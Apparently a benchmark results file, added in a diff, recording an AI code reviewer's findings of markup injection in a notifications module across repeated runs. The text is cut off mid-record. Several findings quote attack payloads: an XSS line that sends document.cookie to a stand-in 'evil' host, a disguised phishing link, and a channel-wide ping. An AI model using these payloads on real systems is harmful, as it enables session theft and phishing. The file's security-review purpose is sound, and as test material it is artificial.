@@ -1,0 +1,1370 @@
+{
+  "model": "deepseek-v4-flash@fireworks",
+  "byokReasoning": "none",
+  "judge": "gemini-3-flash-preview",
+  "judgeReasoningEffort": null,
+  "reps": 5,
+  "engine": {
+    "commit": "3a8f276de614a742dd928151d877f3cf12aff4d7",
+    "sourceDigest": "7003ef4b9fc10ff89b54187d366c3618e0b90018576932d61a57bfca21ef5072"
+  },
+  "startedAt": "2026-10-13T21:40:57.026Z",
+  "updatedAt": "2026-10-13T22:06:33.620Z",
+  "complete": true,
+  "selectedCases": [
+    "P37-markup-strip-new-sinks",
+    "P37-markup-strip-new-sinks-control"
+  ],
+  "summary": {
+    "measured": 10,
+    "infra": 0,
+    "problems": {
+      "unverified-shipped (#2040)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "repeat-of-sent": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "revision-unlinked (#2039/#2020)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "refuted-shipped (control)": {
+        "n": 0,
+        "violations": 0,
+        "rate": null
+      },
+      "true-bug-missed (guard)": {
+        "n": 10,
+        "violations": 0,
+        "rate": 0
+      },
+      "index-reference (#2039)": {
+        "n": 18,
+        "violations": 0,
+        "rate": 0
+      }
+    },
+    "byCase": {
+      "P37-markup-strip-new-sinks · chat-inbox-markup-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      },
+      "P37-markup-strip-new-sinks-control · chat-inbox-markup-new-site [deliver]": {
+        "pass": 5,
+        "n": 5,
+        "delivered": 5
+      }
+    }
+  },
+  "rows": [
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 143371,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox builds the inbox `html` from raw `m.authorName` and `m.body` without calling stripInlineMarkup. WHY: clients.ts documents that this `html` is rendered as-is in the web app's notification inbox, so a comment body containing e.g. `<img src=x onerror=fetch('//evil/'+document.cookie)>` is stored and executed as XSS for the recipient, and a crafted authorName breaks out of the `<strong>` wrapper. HOW: wrap both values, e.g. `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``, consistent with mentionEmail and the sanitize.ts contract.",
+          "keep": true,
+          "rationale": "Confirmed by code: mentions.ts:28 interpolates raw m.authorName and m.body into the inbox `html` without stripInlineMarkup, while mentionEmail (15-16) sanitizes and sanitize.ts states every outbound sink must pass user text through stripInlineMarkup; clients.ts:11 documents that this `html` is rendered as-is in the web app. So a crafted comment body/authorName executes as stored XSS in the recipient's inbox — a real, reachable sink. This is a distinct operation from the earlier decision's mentionEmail sink, so it is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates raw `m.authorName` and `m.body` into the chat message text without stripInlineMarkup. WHY: clients.ts:6 documents chat text as markup where `<url|label>` renders a live link and `<!channel>` pings everyone, so a comment body can post a phishing link (`<https://evil.example|Reset password>`) or mass-ping the channel. HOW: pass both through stripInlineMarkup, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``, matching the sanitize.ts invariant.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (mentions.ts:20-24) interpolates raw m.authorName and m.body into the chat text. clients.ts:6 documents chat text as markup where <url|label> renders a live link and <!channel> pings everyone, and sanitize.ts:1-3 states the invariant that every outbound sink must pass user text through stripInlineMarkup. The sibling mentionEmail was already sanitized (prior decision), confirming these fields are user input, so a comment body like <https://evil.example|Reset password> would render as a phishing link and <!channel> would mass-ping. This is a distinct operation/sink (chat vs email), not a repeat of the mentionEmail decision.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 13,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 27,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `clients.ts` renders the inbox `html` as-is, a comment body such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` is stored and executed as XSS for the recipient, and a crafted `authorName` can break out of the `<strong>` wrapper. Pass both `m.authorName` and `m.body` through `stripInlineMarkup` in `mentionInbox`'s `html`, matching `mentionEmail` and the `sanitize.ts` contract."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 21,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `clients.ts:6` treats chat text as markup where `<url|label>` renders a live link and `<!channel>` pings everyone, a comment body can post a phishing link such as `<https://evil.example|Reset password>` or mass-ping the channel. Pass both `m.authorName` and `m.body` through `stripInlineMarkup` in `mentionChat`, matching the `sanitize.ts` invariant."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 131114,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: The new mentionChat and mentionInbox sinks interpolate m.authorName and m.body without stripInlineMarkup, unlike mentionEmail, violating the invariant documented in sanitize.ts ('Every outbound sink passes user text through stripInlineMarkup first'). WHY: clients.ts documents that chat `text` renders `<url|label>` as a live link and `<!channel>` as an everyone-ping, and that inbox `html` is rendered as-is — so an attacker-controlled comment body like `<https://evil.example|Reset password>` creates a phishing link sent from our chat/domain, `<!channel>` triggers a mass notification, and `<img src=x onerror=...>` is stored XSS in the web app's inbox. HOW: wrap both user-controlled fields, e.g. `text: \\`${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>\\`` and `html: \\`<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}\\``.",
+          "keep": true,
+          "rationale": "Verified: mentionEmail uses stripInlineMarkup (lines 15-16) but mentionChat (line 22) and mentionInbox (line 28) interpolate m.authorName and m.body raw. sanitize.ts documents the invariant that every outbound sink must pass user text through stripInlineMarkup, and clients.ts confirms chat text renders <url|label> links / <!channel> pings and inbox html is rendered as-is. The prior decision only covered mentionEmail, so this is a distinct operation (different sinks), not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 8,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Unlike `mentionEmail`, the new `mentionChat` and `mentionInbox` sinks interpolate `m.authorName` and `m.body` without `stripInlineMarkup`, breaking the invariant documented in `sanitize.ts` that every outbound sink passes user text through it; since `clients.ts` documents that chat `text` renders `<url|label>` as a live link and `<!channel>` as an everyone-ping and that inbox `html` is rendered as-is, an attacker-controlled comment body such as `<https://evil.example|Reset password>` creates a phishing link from our chat/domain, `<!channel>` triggers a mass notification, and `<img src=x onerror=...>` is stored XSS in the web app's inbox. Wrap both user-controlled fields in `stripInlineMarkup` for the chat `text` and the inbox `html`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 3,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 113087,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: The newly added mentionChat and mentionInbox sinks interpolate the user-controlled m.authorName and m.body directly into chat markup and HTML without passing them through stripInlineMarkup. WHY: A comment body such as `<!channel>` pings everyone and `<https://evil.example|Reset password>` renders a live phishing link in chat, while the inbox sink renders raw HTML as-is (per clients.ts) enabling stored XSS in the web app — violating the invariant documented in sanitize.ts ('Every outbound sink passes user text through stripInlineMarkup first'). HOW: Wrap both fields with stripInlineMarkup, mirroring mentionEmail: chat text `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}...` and inbox html `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (line 22) and mentionInbox (line 28) interpolate user-controlled m.authorName and m.body without stripInlineMarkup, while mentionEmail (lines 15-16) correctly strips. sanitize.ts documents the invariant that every outbound sink must strip user text, and clients.ts confirms inbox html is \"rendered as is in the web app,\" so raw HTML is a stored-XSS sink; chat markup like <!channel> and <url|text> is a live injection vector. This concerns different sinks/operations than the earlier decision (which covered only mentionEmail), so it is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "html|add\\(",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 8,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 1,
+        "after": 1
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "The new `mentionChat` and `mentionInbox` sinks interpolate user-controlled `m.authorName` and `m.body` without `stripInlineMarkup`, so `<!channel>` can ping everyone, `<https://evil.example|Reset password>` can render a live phishing link in chat, and the inbox sink's raw HTML rendering per `clients.ts` enables stored XSS in the web app, violating the invariant in `sanitize.ts` that every outbound sink passes user text through `stripInlineMarkup` first. Wrap both fields with `stripInlineMarkup`, mirroring `mentionEmail`, in the chat text and inbox HTML."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 4,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 264424,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: `mentionInbox` writes the user-authored `m.authorName` and `m.body` straight into `item.html`, which clients.ts documents as \"rendered as is in the web app's notification inbox\". WHY: a comment/display-name containing markup (e.g. `<img src=x onerror=...>` or `<script>`) is stored and rendered verbatim in the recipient's browser, giving a stored XSS in our own domain; the file's own sanitize.ts contract says every outbound sink must pass user text through `stripInlineMarkup` first. HOW: run both fields through `stripInlineMarkup` before interpolating.",
+          "keep": true,
+          "rationale": "Confirmed stored-XSS: mentionInbox interpolates user-controlled m.authorName and m.body into item.html without stripInlineMarkup, and clients.ts:11 documents that html is \"rendered as is in the web app's notification inbox\" — an HTML sink. sanitize.ts:3 explicitly requires every outbound sink to pass user text through stripInlineMarkup, which mentionEmail does but mentionInbox does not. The prior decision addressed mentionEmail (email sink), a separate operation; this is a distinct sink, so it is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: `mentionChat` puts `m.authorName` and `m.body` into the chat message `text` without stripping markup, even though clients.ts documents that this text is parsed as chat markup where `<url|label>` renders a link and `<!channel>` pings everyone. WHY: a comment containing `<https://evil.example|Reset password>` renders as a live link sent from our bot/domain, and `<!channel>` mass-pings the channel — a phishing/abuse vector; sanitize.ts's stated contract is that every outbound sink strips user text first. HOW: pass both fields through `stripInlineMarkup` before building the text.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat interpolates m.authorName and m.body into chat `text` without sanitization, while clients.ts documents that text is parsed as chat markup (<url|label> links, <!channel> pings) and sanitize.ts states every outbound sink must pass user text through stripInlineMarkup. The sibling mentionEmail already applies stripInlineMarkup, showing the intended pattern the chat sink breaks. This is a distinct sink/operation from the earlier mentionEmail decision, so it is not a repeat. Not refuted.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts",
+                "startLine": 1,
+                "endLine": 40
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "chat markup|parsed as|url\\|label|post\\(",
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "startLine": 1,
+                "endLine": 60
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 19,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 26,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionInbox` interpolates `m.authorName` and `m.body` directly into `item.html`, which `clients.ts` documents as rendered as is, any markup in a comment or display name is stored and executed in the recipient's browser, creating a stored XSS on our own domain and violating the `sanitize.ts` contract that every outbound sink pass user text through `stripInlineMarkup` first. Run both fields through `stripInlineMarkup` before interpolating them into the HTML."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 20,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `mentionChat` inserts `m.authorName` and `m.body` into chat `text` without stripping markup, `clients.ts`'s chat parsing lets a comment render as a live link such as `<https://evil.example|Reset password>` or use `<!channel>` to mass-ping everyone, enabling phishing or abuse and violating the `sanitize.ts` contract. Pass both fields through `stripInlineMarkup` before building the text."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 5,
+      "case": "P37-markup-strip-new-sinks",
+      "family": "rounds",
+      "sandbox": "alive",
+      "ms": 234805,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates m.authorName and m.body into the inbox `html` without stripInlineMarkup, and clients.ts documents that this html 'is rendered as is in the web app's notification inbox'. WHY: a commenter-controlled display name or body such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` becomes stored XSS executed in the recipient's web app session, violating the module invariant that every outbound sink sanitizes user text. HOW: wrap both values, e.g. `html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox (src/notifications/mentions.ts:28) interpolates m.authorName and m.body directly into the inbox `html`, unlike mentionEmail (lines 15-16) which was fixed with stripInlineMarkup per the earlier decision. clients.ts:11 explicitly documents that this `html` is 'rendered as is in the web app's notification inbox', so a commenter-controlled name/body such as `<img src=x onerror=...>` becomes stored XSS. The prior decision (round-a-P37-markup-strip-new-sinks) only addressed the mentionEmail sink; mentionInbox is a separate operation/sink, so this is a distinct problem, not a repeat. The module invariant in sanitize.ts ('Every outbound sink passes user text through stripInlineMarkup first') is violated here.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "path": "src/notifications/clients.ts",
+                "pattern": "html|as is|inbox"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat puts m.authorName and m.body into the chat message text without stripInlineMarkup, and ChatClient.post's contract documents that text 'uses chat markup: <url|label> renders a link, <!channel> pings everyone'. WHY: a commenter can inject `<!channel>` to mass-notify a whole channel or `<https://evil.example|Reset password>` to render a phishing link from the workspace bot, the same markup-injection failure the email sink was fixed for. HOW: pass both fields through stripInlineMarkup, e.g. `text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>``.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (src/notifications/mentions.ts:22) interpolates m.authorName and m.body directly into the chat text, which ChatClient.post renders as chat markup (`<url|label>` links, `<!channel>` pings). sanitize.ts:1-3 explicitly documents this exact failure mode (`<!channel>` and `<https://evil.example|Reset password>`), and the sibling email sink was already fixed to call stripInlineMarkup (lines 15-16). The prior decision (round-a-P37-markup-strip-new-sinks) targeted the email sink specifically; the chat sink is a separate outbound operation with the same class of bug, so this is a distinct problem, not a repeat. The fix proposed (pass both fields through stripInlineMarkup) is consistent with the existing sanitizer and the file's stated contract. No evidence refutes the claim.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup",
+                "namesOnly": true
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "listDir",
+              "args": {
+                "path": "src/notifications"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 31,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 28,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because this `html` is rendered as-is in the web app's notification inbox, a commenter-controlled `m.authorName` or `m.body` such as `<img src=x onerror=fetch('//evil/'+document.cookie)>` becomes stored XSS in the recipient's session, violating the module invariant that every outbound sink sanitizes user text. Wrap both values in `stripInlineMarkup` before interpolating them into `html`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 22,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Since `ChatClient.post` treats `text` as chat markup, unescaped `m.authorName` or `m.body` lets a commenter inject `<!channel>` to mass-notify a whole channel or `<https://evil.example|Reset password>` to render a phishing link from the workspace bot. Pass both fields through `stripInlineMarkup` before building `text`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 1,
+      "case": "P37-markup-strip-new-sinks-control",
+      "family": "control",
+      "sandbox": "alive",
+      "ms": 114055,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the untrusted m.authorName and m.body straight into the inbox `html` without stripInlineMarkup. WHY: clients.ts:11 documents the inbox html as \"rendered as is in the web app's notification inbox\", so a comment body or display name containing <img src=x onerror=...> executes in the recipient's web session (stored XSS), and this breaks the documented invariant in sanitize.ts that every outbound sink sanitizes user text. HOW: wrap both fields, mirroring mentionEmail: html: `<strong>${stripInlineMarkup(m.authorName)}</strong> mentioned you: ${stripInlineMarkup(m.body)}`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionInbox at line 28 interpolates untrusted m.authorName and m.body directly into the inbox html, unlike mentionEmail (lines 15-16) which sanitizes both via stripInlineMarkup. clients.ts:11 documents the inbox html as rendered as-is in the web app, so a payload like <img src=x onerror=...> in a comment body or display name is stored XSS, and it violates the documented invariant in sanitize.ts:3 that every outbound sink sanitizes user text. The lone previous decision concerns a different file and problem (CSV formula injection), so this is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        },
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionChat interpolates the untrusted m.authorName and m.body into chat `text` without stripInlineMarkup. WHY: chat text is parsed as chat markup (clients.ts:6-7), so an unsanitized body such as `<!channel>` pings the entire channel and `<https://evil.example|Reset password>` renders a phishing link; sanitize.ts explicitly states these inputs must be stripped before reaching any outbound sink. HOW: wrap both fields, mirroring mentionEmail: text: `${stripInlineMarkup(m.authorName)} mentioned you: ${stripInlineMarkup(m.body)}\\n<${m.threadUrl}|Open the thread>`.",
+          "keep": true,
+          "rationale": "Confirmed: mentionChat (mentions.ts:22) interpolates m.authorName and m.body directly into chat `text` with no stripInlineMarkup, while the sibling mentionEmail (lines 15-16) sanitizes both fields. clients.ts:6-7 documents that ChatClient `text` is parsed as chat markup where `<!channel>` pings everyone and `<url|label>` renders a link, and sanitize.ts:1-3 explicitly states such user input must pass through stripInlineMarkup before reaching any outbound sink. The untrusted-input path is real and reachable, so the finding is not refuted. The single PreviousReviewDecision concerns CSV escaping in reports/export.ts — a different file, rule, and failure — so this is not a repeat.",
+          "tools": [
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/mentions.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "findFile",
+              "args": {
+                "pattern": "clients.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "listDir",
+              "args": {
+                "path": "src/notifications"
+              },
+              "failed": false
+            },
+            {
+              "name": "grep",
+              "args": {
+                "pattern": "stripInlineMarkup|stripInlineMarkup",
+                "path": "src"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/sanitize.ts"
+              },
+              "failed": false
+            },
+            {
+              "name": "readFile",
+              "args": {
+                "path": "src/notifications/clients.ts"
+              },
+              "failed": false
+            }
+          ]
+        }
+      ],
+      "alreadyPosted": [],
+      "sandboxCalls": 15,
+      "sandboxFailed": 0,
+      "anomalies": {
+        "stepsLe2": false,
+        "zeroToolCalls": false,
+        "zeroStrongEvidenceFiles": false,
+        "zeroCoverage": false,
+        "lowCoverage": false,
+        "lowStrongEvidenceFiles": false
+      },
+      "warnings": 0,
+      "verification": {
+        "before": 2,
+        "after": 2
+      },
+      "delivered": [
+        {
+          "sourceIndex": 0,
+          "file": "src/notifications/mentions.ts",
+          "line": 28,
+          "severity": "critical",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `clients.ts:11` documents the inbox `html` as rendered as is, `mentionInbox` lets an untrusted `m.authorName` or `m.body` containing `<img src=x onerror=...>` execute in the recipient's web session as stored XSS and breaks `sanitize.ts`'s invariant that every outbound sink sanitizes user text. Wrap both fields with `stripInlineMarkup` before interpolation, mirroring `mentionEmail`."
+        },
+        {
+          "sourceIndex": 1,
+          "file": "src/notifications/mentions.ts",
+          "line": 22,
+          "severity": "high",
+          "linkedById": false,
+          "label": "security",
+          "marked": false,
+          "text": "Because `clients.ts:6-7` parses chat `text` as chat markup, `mentionChat` lets an unsanitized `m.authorName` or `m.body` such as `<!channel>` ping the entire channel or `<https://evil.example|Reset password>` render a phishing link, violating `sanitize.ts`'s requirement that these inputs be stripped before any outbound sink. Wrap both fields with `stripInlineMarkup` before interpolation, mirroring `mentionEmail`."
+        }
+      ],
+      "claims": [
+        {
+          "id": "chat-inbox-markup-new-site",
+          "expect": "deliver",
+          "proposed": false,
+          "truth": "true",
+          "delivered": true,
+          "linked": false,
+          "linkedById": false,
+          "marked": false,
+          "severity": "critical",
+          "pass": true
+        }
+      ]
+    },
+    {
+      "model": "deepseek-v4-flash@fireworks",
+      "rep": 2,
+      "case": "P37-markup-strip-new-sinks-control",
+      "family": "control",
+      "sandbox": "alive",
+      "ms": 99697,
+      "indexRefs": 0,
+      "verificationEvidence": [
+        {
+          "file": "src/notifications/mentions.ts",
+          "claim": "WHAT: mentionInbox interpolates the user-controlled `m.authorName` and `m.body` directly into the `html` field, which clients.ts documents as \"rendered as is in the web app's notification inbox\". WHY: a mention author name or body containing markup (e.g. `<img src=x onerror=...>`) is stored and rendered verbatim, giving stored XSS in the inbox — the sibling mentionEmail already guards this via stripInlineMarkup and sanitize.ts states every outbound sink must pass user text through it. HOW: wrap both fields with stripInlineMarkup.",
+          "keep": true,
